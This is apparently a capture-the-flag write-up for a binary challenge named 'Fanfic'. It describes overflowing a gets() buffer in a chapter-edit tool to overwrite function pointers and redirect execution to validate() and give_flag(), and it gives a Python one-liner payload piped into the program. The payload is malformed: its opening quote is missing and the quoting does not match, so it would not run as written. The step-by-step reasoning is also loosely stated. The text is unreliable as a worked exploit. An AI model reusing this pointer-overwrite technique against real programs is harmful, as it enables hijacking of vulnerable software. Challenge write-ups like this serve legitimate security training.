# Fanfic

Surprisingly, this was very similar to a previous problem, [Heaps of Knowledge](https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/binexploit/Heaps-of-Knowledge), but with slightly altered parameters.

Using the above as a base, I constructed an attack like this:

1. First, I noticed that validate(int ans) required an argument of 0x40. This could be achieved by overflowing the address of *print_ch, especially because it took an int as an argument.

2. Right after that, overflow the address of the next chapter's *print_ch to give_flag().

3. When we attempt to publish our fanfic, these methods will run.

This would all be done using the gets() present in the chapter edit tool, and would require 65 (64 is 0x40) chapters to accomplish. The 64th chapter would run validate(64), and the 65th chapter would give us the flag. 

I generated this code through python and implemented it. Essentially, it creates a title, then repeatedly creates 64 chapters. Finally, it overflows with a length of 258 'A's + our desired location, and finally runs the code.

```
python -c "print Title\n1\n1\n1\n1\n1\n2\n1\n1\n1\n3\n1\n1\n1\n4\n1\n1\n1\n5\n1\n1\n1\n6\n1\n1\n1\n7\n1\n1\n1\n8\n1\n1\n1\n9\n1\n1\n1\n10\n1\n1\n1\n11\n1\n1\n1\n12\n1\n1\n1\n13\n1\n1\n1\n14\n1\n1\n1\n15\n1\n1\n1\n16\n1\n1\n1\n17\n1\n1\n1\n18\n1\n1\n1\n19\n1\n1\n1\n20\n1\n1\n1\n21\n1\n1\n1\n22\n1\n1\n1\n23\n1\n1\n1\n24\n1\n1\n1\n25\n1\n1\n1\n26\n1\n1\n1\n27\n1\n1\n1\n28\n1\n1\n1\n29\n1\n1\n1\n30\n1\n1\n1\n31\n1\n1\n1\n32\n1\n1\n1\n33\n1\n1\n1\n34\n1\n1\n1\n35\n1\n1\n1\n36\n1\n1\n1\n37\n1\n1\n1\n38\n1\n1\n1\n39\n1\n1\n1\n40\n1\n1\n1\n41\n1\n1\n1\n42\n1\n1\n1\n43\n1\n1\n1\n44\n1\n1\n1\n45\n1\n1\n1\n46\n1\n1\n1\n47\n1\n1\n1\n48\n1\n1\n1\n49\n1\n1\n1\n50\n1\n1\n1\n51\n1\n1\n1\n52\n1\n1\n1\n53\n1\n1\n1\n54\n1\n1\n1\n55\n1\n1\n1\n56\n1\n1\n1\n57\n1\n1\n1\n58\n1\n1\n1\n59\n1\n1\n1\n60\n1\n1\n1\n61\n1\n1\n1\n62\n1\n1\n1\n63\n1\n1\n1\n64\n1\n1\n1\n65\n1\n1\n' + '1\n64\n' + 'A'*258 + '\xb4\x87\x04\x08\n' + '1\n65\n' + 'A'*258 + '\xef\x87\x04\x08\n' + '3\n'" | ./fanfic

